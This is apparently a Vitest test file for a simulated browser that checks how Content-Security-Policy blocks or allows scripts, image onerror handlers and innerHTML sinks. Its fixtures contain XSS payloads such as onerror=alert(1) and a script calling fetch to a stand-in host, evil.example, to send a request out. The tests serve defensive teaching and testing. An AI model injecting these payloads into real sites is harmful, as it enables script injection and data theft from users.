import { describe, expect, it } from 'vitest';
import { response } from './http';
import { loadInner, loadPage } from './page';
import type { Site } from './site';
import { createWorld } from './world';

const SHOP = 'https://shop.example';
const EVIL = 'https://evil.example';

const shop = (body: string, csp?: string, extra: Record<string, string> = {}): Site => ({
  origin: SHOP,
  party: 'shop',
  routes: [{ method: 'GET', path: '/page', handler: () => response(200, body, { headers: { ...(csp && { 'content-security-policy': csp }), ...extra } }) }],
});

const evil: Site = {
  origin: EVIL,
  party: 'evil',
  routes: [
    { method: 'GET', path: '/c', handler: () => response(200) },
    { method: 'GET', path: '/x.js', handler: () => response(200, "fetch('https://evil.example/c?from=x')") },
  ],
};

const world = (body: string, csp?: string) => createWorld([shop(body, csp), evil]);

describe('loadPage', () => {
  it('runs an allowed script', () => {
    const run = loadPage(world('<script>alert(1)</script>'), `${SHOP}/page`);
    expect(run.response.status).toBe(200);
    expect(run.scripts).toEqual([{ source: 'alert(1)', status: 'ran', actions: ['alert("1")'] }]);
  });

  it('reports a blocked script with its rule, and does not run it', () => {
    const w = world("<script>fetch('https://evil.example/c')</script>", "script-src 'self'");
    const run = loadPage(w, `${SHOP}/page`);
    expect(run.scripts).toEqual([{ source: "fetch('https://evil.example/c')", status: 'blocked', rule: "script-src 'self'", actions: [] }]);
    expect(w.events.filter((event) => event.to === 'evil')).toEqual([]);
  });

  it('reports text outside the language', () => {
    const run = loadPage(world('<script>eval(1)</script>'), `${SHOP}/page`);
    expect(run.scripts[0]!.status).toBe('not understood');
    expect(run.scripts[0]!.actions[0]).toContain('alert');
  });

  it('fetches an external script from its simulated site and runs it', () => {
    const w = world(`<script src=${EVIL}/x.js></script>`);
    const run = loadPage(w, `${SHOP}/page`);
    expect(run.scripts[0]).toMatchObject({ status: 'ran', actions: [`sent a request to ${EVIL}/c?from=x`] });
    expect(w.events.map((event) => event.request.url)).toEqual([`${SHOP}/page`, `${EVIL}/x.js`, `${EVIL}/c?from=x`]);
  });

  it('asks for no outside script that the policy blocks', () => {
    const w = world(`<script src=${EVIL}/x.js></script>`, "script-src 'self'");
    expect(loadPage(w, `${SHOP}/page`).scripts[0]!.status).toBe('blocked');
    expect(w.events).toHaveLength(1);
  });

  it('says when an outside script cannot be loaded', () => {
    expect(loadPage(world(`<script src=${EVIL}/nope.js></script>`), `${SHOP}/page`).scripts[0]).toMatchObject({ status: 'failed to load' });
    expect(loadPage(world('<script src=https://real-site.com/x.js></script>'), `${SHOP}/page`).scripts[0]).toMatchObject({ status: 'failed to load' });
  });

  it('leaves a click handler waiting, whatever the policy', () => {
    expect(loadPage(world('<a onclick=alert(1)>go</a>', "script-src 'self'"), `${SHOP}/page`).scripts[0]).toMatchObject({ status: 'waits for a click', actions: [] });
  });

  it('never sends the fragment to the server', () => {
    const w = world('hi');
    loadPage(w, `${SHOP}/page#secret`);
    expect(w.events[0]!.request.url).toBe(`${SHOP}/page`);
  });

  it('gives no scripts for a missing page', () => {
    expect(loadPage(world('hi'), `${SHOP}/nope`)).toMatchObject({ response: { status: 404 }, scripts: [] });
  });
});

describe('an image handler', () => {
  const images: Site = {
    origin: 'https://images.example',
    party: 'images',
    routes: [{ method: 'GET', path: '/ok.png', handler: () => response(200, 'bytes', { headers: { 'content-type': 'image/png' } }) }],
  };
  const load = (src: string) => loadPage(createWorld([shop(`<img src=${src} onerror=alert(1)>`), images]), `${SHOP}/page`).scripts[0]!;

  it('fires when the image fails to load', () => {
    expect(load('https://images.example/nope.png').status).toBe('ran');
    expect(load('x').status).toBe('ran');
  });

  it('fires when the answer is not an image', () => {
    expect(load(`${SHOP}/page`).status).toBe('ran');
  });

  it('stays quiet when the image loads', () => {
    expect(load('https://images.example/ok.png')).toMatchObject({ status: 'waits for a click', actions: [] });
  });
});

describe('loadInner', () => {
  it('leaves <script> inert and runs onerror', () => {
    expect(loadInner(world('hi'), `${SHOP}/page`, '<script>alert(1)</script>').scripts).toEqual([]);
    expect(loadInner(world('hi'), `${SHOP}/page`, '<img src=x onerror=alert(1)>').scripts[0]).toMatchObject({ status: 'ran', actions: ['alert("1")'] });
  });

  it('applies the page policy', () => {
    expect(loadInner(world('hi', "script-src 'self'"), `${SHOP}/page`, '<img src=x onerror=alert(1)>').scripts[0]).toMatchObject({ status: 'blocked' });
  });

  it('keeps the text as text when the page writes with textContent', () => {
    const w = createWorld([shop('hi', undefined, { 'x-hash-sink': 'textContent' }), evil]);
    expect(loadInner(w, `${SHOP}/page`, '<img src=x onerror=alert(1)>').scripts).toEqual([]);
  });

  it('sends only the address, not the html', () => {
    const w = world('hi');
    loadInner(w, `${SHOP}/page#<img>`, '<img>');
    expect(w.events[0]!.request.url).toBe(`${SHOP}/page`);
  });
});
